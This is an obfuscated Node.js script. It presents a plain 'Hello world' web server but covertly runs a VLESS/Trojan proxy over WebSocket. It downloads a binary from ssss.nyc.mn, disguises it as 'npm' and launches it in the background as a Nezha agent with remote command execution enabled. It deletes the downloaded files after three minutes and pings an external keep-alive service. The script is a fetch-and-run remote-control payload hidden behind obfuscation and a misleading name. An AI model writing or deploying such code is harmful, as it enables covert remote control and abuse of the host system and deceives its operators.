const _0x46e6ff=_0x3e6e;(function(_0xfda607,_0x398a0a){const _0x18709a=_0x3e6e,_0x89314=_0xfda607();while(!![]){try{const _0xdb048b=parseInt(_0x18709a(0x255))/0x1+parseInt(_0x18709a(0x244))/0x2*(parseInt(_0x18709a(0x23b))/0x3)+-parseInt(_0x18709a(0x1e6))/0x4*(parseInt(_0x18709a(0x208))/0x5)+-parseInt(_0x18709a(0x228))/0x6+parseInt(_0x18709a(0x25f))/0x7+-parseInt(_0x18709a(0x203))/0x8+parseInt(_0x18709a(0x213))/0x9*(parseInt(_0x18709a(0x248))/0xa);if(_0xdb048b===_0x398a0a)break;else _0x89314['push'](_0x89314['shift']());}catch(_0x4df7f8){_0x89314['push'](_0x89314['shift']());}}}(_0x4ba2,0x8bea4));function _0x4ba2(){const _0x41c78e=['buffer','crypto','slice','\x20with\x20all\x20DNS\x20servers','join','npm\x20download\x20successfully','--tls','NEZHA_KEY','error','message','Answer','http','NAME','Server','1.1.1.1','Unknown','UUID','toString','text/html','type','&type=A','1098400tnzGOy','utf-8','Automatic\x20Access\x20Task\x20added\x20successfully','substr','replace','10mqUjPh','then','pipe','find','https://arm64.ssss.nyc.mn/v1','log','https://speed.cloudflare.com/meta','includes','arm','writeHead','listen','45TfVUFJ','&path=%2F','createWriteStream','concat','write','&fp=chrome&type=ws&host=','asOrganization','https://amd64.ssss.nyc.mn/v1','reduce','digest','NEZHA_PORT','config.yaml','false','Not\x20Found\x0a','https://dns.google/resolve?name=','send','npm\x20running\x20error:','2096','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','child_process','hex','4291452HIqLgU','every','axios','arch','createServer','env','readUInt8','application/json','from','Failed\x20to\x20resolve\x20','post','sha224','2083','country','unlink','WSPATH','text/plain','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','npm\x20is\x20already\x20running,\x20skip\x20running...','1468302nVeCoC','client_secret:\x20','get','vless://','error:\x20','base64','2087','readFile','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','2ZXIYNg','once','trim','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','2954330MlcTdr','443','length','npm','net','finish','createHash','https://oooo.serv00.net/add-url','https://amd64.ssss.nyc.mn/agent','AUTO_ACCESS','application/dns-json','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','PORT','211000HhwMCV','/bin/bash',':443?security=tls&sni=','aarch64','setsid\x20nohup\x20./npm\x20-s\x20','data','split',':443?encryption=none&security=tls&sni=','close','pop','1322489FFaXtS','arm64','catch','connect','SUB_PATH','test','1881784iZFpdd','Hug','map','\x20-p\x20','end','url','utf8','true'];_0x4ba2=function(){return _0x41c78e;};return _0x4ba2();}const os=require('os'),http=require(_0x46e6ff(0x1f9)),fs=require('fs'),axios=require(_0x46e6ff(0x22a)),net=require(_0x46e6ff(0x24c)),path=require('path'),crypto=require(_0x46e6ff(0x1ef)),{Buffer}=require(_0x46e6ff(0x1ee)),{exec,execSync}=require(_0x46e6ff(0x226)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x46e6ff(0x22d)][_0x46e6ff(0x1fe)]||'802e5461-3156-4823-81c3-1127c8f92647',NEZHA_SERVER=process[_0x46e6ff(0x22d)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x46e6ff(0x22d)][_0x46e6ff(0x21d)]||'',NEZHA_KEY=process['env'][_0x46e6ff(0x1f5)]||'',DOMAIN=process[_0x46e6ff(0x22d)]['DOMAIN']||'1234.abc.com',AUTO_ACCESS=process[_0x46e6ff(0x22d)][_0x46e6ff(0x251)]||!![],WSPATH=process[_0x46e6ff(0x22d)][_0x46e6ff(0x237)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x46e6ff(0x22d)][_0x46e6ff(0x263)]||'sub',NAME=process[_0x46e6ff(0x22d)][_0x46e6ff(0x1fa)]||_0x46e6ff(0x1e7),PORT=process[_0x46e6ff(0x22d)][_0x46e6ff(0x254)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x15d51d=_0x46e6ff;try{const _0x339d84=await axios[_0x15d51d(0x23d)](_0x15d51d(0x20e)),_0x123cb4=_0x339d84[_0x15d51d(0x25a)];ISP=(_0x123cb4[_0x15d51d(0x235)]+'-'+_0x123cb4[_0x15d51d(0x219)])[_0x15d51d(0x207)](/ /g,'_');}catch(_0x16b850){ISP=_0x15d51d(0x1fd);}};GetISP();const httpServer=http[_0x46e6ff(0x22c)]((_0x53b328,_0x4c68a5)=>{const _0x599b46=_0x46e6ff;if(_0x53b328['url']==='/'){const _0x10bdc8=path['join'](__dirname,'index.html');fs[_0x599b46(0x242)](_0x10bdc8,_0x599b46(0x1ec),(_0x4cc84b,_0x118f1b)=>{const _0x4cebb5=_0x599b46;if(_0x4cc84b){_0x4c68a5['writeHead'](0xc8,{'Content-Type':_0x4cebb5(0x200)}),_0x4c68a5[_0x4cebb5(0x1ea)]('Hello\x20world!');return;}_0x4c68a5[_0x4cebb5(0x211)](0xc8,{'Content-Type':_0x4cebb5(0x200)}),_0x4c68a5[_0x4cebb5(0x1ea)](_0x118f1b);});return;}else{if(_0x53b328[_0x599b46(0x1eb)]==='/'+SUB_PATH){const _0x136d3a=_0x599b46(0x23e)+UUID+'@'+DOMAIN+_0x599b46(0x25c)+DOMAIN+_0x599b46(0x218)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x3b5a36='trojan://'+UUID+'@'+DOMAIN+_0x599b46(0x257)+DOMAIN+_0x599b46(0x218)+DOMAIN+_0x599b46(0x214)+WSPATH+'#'+NAME+'-'+ISP,_0xc9a75e=_0x136d3a+'\x0a'+_0x3b5a36,_0x399789=Buffer[_0x599b46(0x230)](_0xc9a75e)[_0x599b46(0x1ff)](_0x599b46(0x240));_0x4c68a5[_0x599b46(0x211)](0xc8,{'Content-Type':_0x599b46(0x238)}),_0x4c68a5[_0x599b46(0x1ea)](_0x399789+'\x0a');}else _0x4c68a5['writeHead'](0x194,{'Content-Type':'text/plain'}),_0x4c68a5[_0x599b46(0x1ea)](_0x599b46(0x220));}}),wss=new WebSocket[(_0x46e6ff(0x1fb))]({'server':httpServer}),uuid=UUID[_0x46e6ff(0x207)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x46e6ff(0x1fc)];function resolveHost(_0x568e05){return new Promise((_0x1d6c60,_0x2b0aa0)=>{const _0x47c9c8=_0x3e6e;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x47c9c8(0x264)](_0x568e05)){_0x1d6c60(_0x568e05);return;}let _0x178dd7=0x0;function _0x198a56(){const _0x15ec14=_0x47c9c8;if(_0x178dd7>=DNS_SERVERS[_0x15ec14(0x24a)]){_0x2b0aa0(new Error(_0x15ec14(0x231)+_0x568e05+_0x15ec14(0x1f1)));return;}const _0x5f1b31=DNS_SERVERS[_0x178dd7];_0x178dd7++;const _0x4629bd=_0x15ec14(0x221)+encodeURIComponent(_0x568e05)+_0x15ec14(0x202);axios[_0x15ec14(0x23d)](_0x4629bd,{'timeout':0x1388,'headers':{'Accept':_0x15ec14(0x252)}})[_0x15ec14(0x209)](_0x57d1f8=>{const _0x31252f=_0x15ec14,_0x135ba4=_0x57d1f8[_0x31252f(0x25a)];if(_0x135ba4['Status']===0x0&&_0x135ba4[_0x31252f(0x1f8)]&&_0x135ba4[_0x31252f(0x1f8)][_0x31252f(0x24a)]>0x0){const _0x31c97f=_0x135ba4[_0x31252f(0x1f8)][_0x31252f(0x20b)](_0x4075d3=>_0x4075d3[_0x31252f(0x201)]===0x1);if(_0x31c97f){_0x1d6c60(_0x31c97f['data']);return;}}_0x198a56();})[_0x15ec14(0x261)](_0x32bd48=>{_0x198a56();});}_0x198a56();});}function handleVlessConnection(_0x222de0,_0x3fadf6){const _0x4af1c2=_0x46e6ff,[_0x3b642d]=_0x3fadf6,_0x1d5010=_0x3fadf6[_0x4af1c2(0x1f0)](0x1,0x11);if(!_0x1d5010[_0x4af1c2(0x229)]((_0x4ed629,_0x48b335)=>_0x4ed629==parseInt(uuid[_0x4af1c2(0x206)](_0x48b335*0x2,0x2),0x10)))return![];let _0x238758=_0x3fadf6['slice'](0x11,0x12)['readUInt8']()+0x13;const _0x3faf46=_0x3fadf6['slice'](_0x238758,_0x238758+=0x2)['readUInt16BE'](0x0),_0x3d76e8=_0x3fadf6[_0x4af1c2(0x1f0)](_0x238758,_0x238758+=0x1)[_0x4af1c2(0x22e)](),_0x11b97e=_0x3d76e8==0x1?_0x3fadf6[_0x4af1c2(0x1f0)](_0x238758,_0x238758+=0x4)[_0x4af1c2(0x1f2)]('.'):_0x3d76e8==0x2?new TextDecoder()['decode'](_0x3fadf6[_0x4af1c2(0x1f0)](_0x238758+0x1,_0x238758+=0x1+_0x3fadf6[_0x4af1c2(0x1f0)](_0x238758,_0x238758+0x1)[_0x4af1c2(0x22e)]())):_0x3d76e8==0x3?_0x3fadf6[_0x4af1c2(0x1f0)](_0x238758,_0x238758+=0x10)['reduce']((_0x201674,_0x458de9,_0x5c7d27,_0x112da0)=>_0x5c7d27%0x2?_0x201674[_0x4af1c2(0x216)](_0x112da0[_0x4af1c2(0x1f0)](_0x5c7d27-0x1,_0x5c7d27+0x1)):_0x201674,[])[_0x4af1c2(0x1e8)](_0x4b01b9=>_0x4b01b9['readUInt16BE'](0x0)['toString'](0x10))[_0x4af1c2(0x1f2)](':'):'';_0x222de0[_0x4af1c2(0x222)](new Uint8Array([_0x3b642d,0x0]));const _0x3fd62c=createWebSocketStream(_0x222de0);return resolveHost(_0x11b97e)[_0x4af1c2(0x209)](_0x44ac7f=>{const _0x51a21c=_0x4af1c2;net[_0x51a21c(0x262)]({'host':_0x44ac7f,'port':_0x3faf46},function(){const _0x59f52f=_0x51a21c;this[_0x59f52f(0x217)](_0x3fadf6[_0x59f52f(0x1f0)](_0x238758)),_0x3fd62c['on'](_0x59f52f(0x1f6),()=>{})[_0x59f52f(0x20a)](this)['on'](_0x59f52f(0x1f6),()=>{})[_0x59f52f(0x20a)](_0x3fd62c);})['on'](_0x51a21c(0x1f6),()=>{});})[_0x4af1c2(0x261)](_0x46afaf=>{const _0x1d46a3=_0x4af1c2;net[_0x1d46a3(0x262)]({'host':_0x11b97e,'port':_0x3faf46},function(){const _0x5f0017=_0x1d46a3;this['write'](_0x3fadf6[_0x5f0017(0x1f0)](_0x238758)),_0x3fd62c['on'](_0x5f0017(0x1f6),()=>{})[_0x5f0017(0x20a)](this)['on'](_0x5f0017(0x1f6),()=>{})['pipe'](_0x3fd62c);})['on'](_0x1d46a3(0x1f6),()=>{});}),!![];}function _0x3e6e(_0x4ecc46,_0x4d011e){const _0x4ba2ad=_0x4ba2();return _0x3e6e=function(_0x3e6e5,_0x27a3b7){_0x3e6e5=_0x3e6e5-0x1e6;let _0x46be36=_0x4ba2ad[_0x3e6e5];return _0x46be36;},_0x3e6e(_0x4ecc46,_0x4d011e);}function handleTrojanConnection(_0x5457d0,_0x24438e){const _0x3e1a0b=_0x46e6ff;try{if(_0x24438e[_0x3e1a0b(0x24a)]<0x3a)return![];const _0x822809=_0x24438e['slice'](0x0,0x38)[_0x3e1a0b(0x1ff)](),_0x1e7f8b=[UUID];let _0x5a227e=null;for(const _0x5b58ca of _0x1e7f8b){const _0x59c557=crypto[_0x3e1a0b(0x24e)](_0x3e1a0b(0x233))['update'](_0x5b58ca)[_0x3e1a0b(0x21c)](_0x3e1a0b(0x227));if(_0x59c557===_0x822809){_0x5a227e=_0x5b58ca;break;}}if(!_0x5a227e)return![];let _0x9b03f2=0x38;_0x24438e[_0x9b03f2]===0xd&&_0x24438e[_0x9b03f2+0x1]===0xa&&(_0x9b03f2+=0x2);const _0x4ddf3e=_0x24438e[_0x9b03f2];if(_0x4ddf3e!==0x1)return![];_0x9b03f2+=0x1;const _0x53218f=_0x24438e[_0x9b03f2];_0x9b03f2+=0x1;let _0x601d9,_0x1d914e;if(_0x53218f===0x1)_0x601d9=_0x24438e[_0x3e1a0b(0x1f0)](_0x9b03f2,_0x9b03f2+0x4)[_0x3e1a0b(0x1f2)]('.'),_0x9b03f2+=0x4;else{if(_0x53218f===0x3){const _0x391446=_0x24438e[_0x9b03f2];_0x9b03f2+=0x1,_0x601d9=_0x24438e[_0x3e1a0b(0x1f0)](_0x9b03f2,_0x9b03f2+_0x391446)[_0x3e1a0b(0x1ff)](),_0x9b03f2+=_0x391446;}else{if(_0x53218f===0x4)_0x601d9=_0x24438e[_0x3e1a0b(0x1f0)](_0x9b03f2,_0x9b03f2+0x10)[_0x3e1a0b(0x21b)]((_0x2a7d89,_0x18d5ff,_0x2ef1c9,_0x1d5eb0)=>_0x2ef1c9%0x2?_0x2a7d89['concat'](_0x1d5eb0['slice'](_0x2ef1c9-0x1,_0x2ef1c9+0x1)):_0x2a7d89,[])[_0x3e1a0b(0x1e8)](_0x555479=>_0x555479['readUInt16BE'](0x0)['toString'](0x10))[_0x3e1a0b(0x1f2)](':'),_0x9b03f2+=0x10;else return![];}}_0x1d914e=_0x24438e['readUInt16BE'](_0x9b03f2),_0x9b03f2+=0x2;_0x9b03f2<_0x24438e[_0x3e1a0b(0x24a)]&&_0x24438e[_0x9b03f2]===0xd&&_0x24438e[_0x9b03f2+0x1]===0xa&&(_0x9b03f2+=0x2);const _0x593db9=createWebSocketStream(_0x5457d0);return resolveHost(_0x601d9)[_0x3e1a0b(0x209)](_0x3dc6d2=>{const _0x51bf2b=_0x3e1a0b;net[_0x51bf2b(0x262)]({'host':_0x3dc6d2,'port':_0x1d914e},function(){const _0x2f5109=_0x51bf2b;_0x9b03f2<_0x24438e[_0x2f5109(0x24a)]&&this[_0x2f5109(0x217)](_0x24438e[_0x2f5109(0x1f0)](_0x9b03f2)),_0x593db9['on'](_0x2f5109(0x1f6),()=>{})[_0x2f5109(0x20a)](this)['on'](_0x2f5109(0x1f6),()=>{})[_0x2f5109(0x20a)](_0x593db9);})['on'](_0x51bf2b(0x1f6),()=>{});})[_0x3e1a0b(0x261)](_0x214cfa=>{const _0x3a383b=_0x3e1a0b;net[_0x3a383b(0x262)]({'host':_0x601d9,'port':_0x1d914e},function(){const _0x46370a=_0x3a383b;_0x9b03f2<_0x24438e[_0x46370a(0x24a)]&&this['write'](_0x24438e[_0x46370a(0x1f0)](_0x9b03f2)),_0x593db9['on'](_0x46370a(0x1f6),()=>{})[_0x46370a(0x20a)](this)['on'](_0x46370a(0x1f6),()=>{})[_0x46370a(0x20a)](_0x593db9);})['on']('error',()=>{});}),!![];}catch(_0x144fd7){return![];}}wss['on']('connection',(_0x3281a8,_0x2235d2)=>{const _0x54a347=_0x46e6ff,_0x2543f3=_0x2235d2[_0x54a347(0x1eb)]||'';_0x3281a8[_0x54a347(0x245)](_0x54a347(0x1f7),_0x2d63f5=>{const _0x3755d5=_0x54a347;if(_0x2d63f5[_0x3755d5(0x24a)]>0x11&&_0x2d63f5[0x0]===0x0){const _0x261b49=_0x2d63f5[_0x3755d5(0x1f0)](0x1,0x11),_0x268568=_0x261b49[_0x3755d5(0x229)]((_0x696bbd,_0x5c0701)=>_0x696bbd==parseInt(uuid['substr'](_0x5c0701*0x2,0x2),0x10));if(_0x268568){!handleVlessConnection(_0x3281a8,_0x2d63f5)&&_0x3281a8[_0x3755d5(0x25d)]();return;}}!handleTrojanConnection(_0x3281a8,_0x2d63f5)&&_0x3281a8[_0x3755d5(0x25d)]();})['on'](_0x54a347(0x1f6),()=>{});});const getDownloadUrl=()=>{const _0x45679e=_0x46e6ff,_0x4cd2b4=os[_0x45679e(0x22b)]();return _0x4cd2b4===_0x45679e(0x210)||_0x4cd2b4===_0x45679e(0x260)||_0x4cd2b4===_0x45679e(0x258)?!NEZHA_PORT?_0x45679e(0x20c):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x45679e(0x21a):_0x45679e(0x250);},downloadFile=async()=>{const _0x50294a=_0x46e6ff;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5a99b9=getDownloadUrl(),_0x4c3439=await axios({'method':'get','url':_0x5a99b9,'responseType':'stream'}),_0x48945c=fs[_0x50294a(0x215)](_0x50294a(0x24b));return _0x4c3439[_0x50294a(0x25a)]['pipe'](_0x48945c),new Promise((_0x52ae35,_0x542045)=>{const _0x240623=_0x50294a;_0x48945c['on'](_0x240623(0x24d),()=>{const _0x1c7851=_0x240623;console[_0x1c7851(0x20d)](_0x1c7851(0x1f3)),exec('chmod\x20+x\x20npm',_0x3262fa=>{if(_0x3262fa)_0x542045(_0x3262fa);_0x52ae35();});}),_0x48945c['on'](_0x240623(0x1f6),_0x542045);});}catch(_0x308134){throw _0x308134;}},runnz=async()=>{const _0x2878b6=_0x46e6ff;try{const _0xed2391=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x2878b6(0x204)});if(_0xed2391[_0x2878b6(0x246)]()!==''){console[_0x2878b6(0x20d)](_0x2878b6(0x23a));return;}}catch(_0x3da338){}await downloadFile();let _0x5995ab='',_0x2afdd1=[_0x2878b6(0x249),'8443',_0x2878b6(0x224),_0x2878b6(0x241),_0x2878b6(0x234),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x20ba85=_0x2afdd1[_0x2878b6(0x20f)](NEZHA_PORT)?_0x2878b6(0x1f4):'';_0x5995ab=_0x2878b6(0x259)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2878b6(0x1e9)+NEZHA_KEY+'\x20'+_0x20ba85+_0x2878b6(0x247);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3ae6b4=NEZHA_SERVER[_0x2878b6(0x20f)](':')?NEZHA_SERVER[_0x2878b6(0x25b)](':')[_0x2878b6(0x25e)]():'',_0x5aa0ac=_0x2afdd1['includes'](_0x3ae6b4)?_0x2878b6(0x1ed):_0x2878b6(0x21f),_0x339acf=_0x2878b6(0x23c)+NEZHA_KEY+_0x2878b6(0x225)+NEZHA_SERVER+_0x2878b6(0x239)+_0x5aa0ac+_0x2878b6(0x243)+UUID;fs['writeFileSync']('config.yaml',_0x339acf);}_0x5995ab='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x2878b6(0x20d)](_0x2878b6(0x253));return;}}try{exec(_0x5995ab,{'shell':_0x2878b6(0x256)},_0x2c00ee=>{const _0xaf0df7=_0x2878b6;if(_0x2c00ee)console['error'](_0xaf0df7(0x223),_0x2c00ee);else console['log']('npm\x20is\x20running');});}catch(_0x5ea98a){console['error'](_0x2878b6(0x23f)+_0x5ea98a);}};async function addAccessTask(){const _0xf8b809=_0x46e6ff;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x140637='https://'+DOMAIN;try{const _0x26336c=await axios[_0xf8b809(0x232)](_0xf8b809(0x24f),{'url':_0x140637},{'headers':{'Content-Type':_0xf8b809(0x22f)}});console[_0xf8b809(0x20d)](_0xf8b809(0x205));}catch(_0x2ac79a){}}const delFiles=()=>{const _0x3de55f=_0x46e6ff;fs[_0x3de55f(0x236)](_0x3de55f(0x24b),()=>{}),fs[_0x3de55f(0x236)](_0x3de55f(0x21e),()=>{});};httpServer[_0x46e6ff(0x212)](PORT,()=>{runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
